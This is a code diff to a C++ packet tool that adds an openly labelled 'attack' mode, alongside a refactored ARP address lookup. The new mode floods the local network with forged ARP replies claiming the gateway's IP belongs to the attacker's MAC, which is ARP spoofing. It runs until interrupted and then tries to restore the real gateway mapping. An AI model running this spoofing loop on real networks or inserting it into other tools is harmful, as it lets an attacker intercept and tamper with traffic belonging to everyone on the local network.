@@ -1,8 +1,14 @@
 #include "core/transport.h"
+#include <signal.h>
+#include <atomic>
+#include <thread>
 #include <iostream>
 
-DEFINE_string(ip, "", "ipv4 address used to choose adapter, select first if empty");
-DEFINE_string(filter, "", "capture filter applied to adapter");
+DEFINE_bool(attack, false, "attack whole network by pretending myself to be gateway");
+
+std::atomic<bool> end_attack = false;
+
+void on_interrupt(int) { end_attack = true; }
 
 int main(int argc, char *argv[])
 {
@@ -12,16 +18,39 @@ int main(int argc, char *argv[])
     FLAGS_logtostderr = 1;
     FLAGS_minloglevel = 0;
 
-    ip4 input_ip = argc >= 2 ? ip4(argv[1]) : ip4::zeros;
-    auto &apt = adaptor::fit(input_ip);
+    if (argc < 2 && !FLAGS_attack) {
+        LOG(ERROR) << "empty ipv4 address, please input ip";
+        return -1;
+    }
+
+    ip4 ip = argc >= 2 ? ip4(argv[1]) : ip4::zeros;
+    auto &apt = adaptor::fit(ip);
     pcap_t *handle = transport::open_adaptor(apt);
-    packet req = packet::arp(input_ip), reply;
-    if (transport::send_and_recv(handle, req, reply, 5000)) {
-        json layers = reply.to_json()["layers"];
-        json mac = layers.back()["source-mac"];
-        std::cout << input_ip.to_str() << " is at " << mac.get<std::string>() << "." << std::endl;
+    std::shared_ptr<void> handle_guard(nullptr, [&](void *) { pcap_close(handle); });
+
+    if (FLAGS_attack) {
+        signal(SIGINT, on_interrupt);
+        mac gateway_mac;
+        if (transport::ip2mac(handle, apt.gateway, gateway_mac)) {
+            LOG(INFO) << "gateway " << apt.gateway.to_str() << " is at " << gateway_mac.to_str();
+        }
+        LOG(INFO) << "forging gateway's mac to " << apt.mac_.to_str() << "...";
+        while (!end_attack) {
+            transport::send(handle, packet::arp(apt.mac_, apt.gateway, apt.mac_, apt.ip, true));
+            std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+        }
+        LOG(INFO) << "attack stopped";
+        if (transport::ip2mac(handle, apt.gateway, gateway_mac, false)) {
+            transport::send(handle, packet::arp(gateway_mac, apt.gateway, apt.mac_, apt.ip, true));
+            LOG(INFO) << "gateway's mac restored to " << gateway_mac.to_str();
+        }
     } else {
-        std::cout << input_ip.to_str() << " is offline." << std::endl;
+        mac mac_;
+        if (transport::ip2mac(handle, ip, mac_)) {
+            std::cout << ip.to_str() << " is at " << mac_.to_str() << "." << std::endl;
+        } else {
+            std::cout << ip.to_str() << " is offline." << std::endl;
+        }
     }
     NT_CATCH
 }
